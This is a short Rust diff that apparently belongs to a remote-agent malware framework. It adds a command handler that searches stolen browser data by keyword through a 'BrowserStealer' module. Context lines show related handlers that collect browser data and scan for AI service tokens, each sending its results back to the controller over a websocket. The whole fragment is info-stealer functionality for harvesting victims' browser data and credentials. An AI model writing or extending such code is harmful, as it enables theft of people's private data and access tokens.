@@ -416,6 +416,12 @@ impl AgentEngine {
                 let r = libra_modules::recon::BrowserStealer::collect(&btype, offset, limit);
                 ws_send(tx, &agent_id, "othersoft.browser.result", &r, rid).await;
             }
+            ws_type::OTHERSOFT_BROWSER_SEARCH => {
+                let btype = data_str(&data, "type", "all");
+                let keyword = data_str(&data, "keyword", "");
+                let r = libra_modules::recon::BrowserStealer::search(&btype, &keyword);
+                ws_send(tx, &agent_id, "othersoft.browser.search.result", &r, rid).await;
+            }
             ws_type::OTHERSOFT_AI => {
                 let r = libra_modules::recon::AITokenScanner::scan();
                 ws_send(tx, &agent_id, "othersoft.ai.result", &r, rid).await;
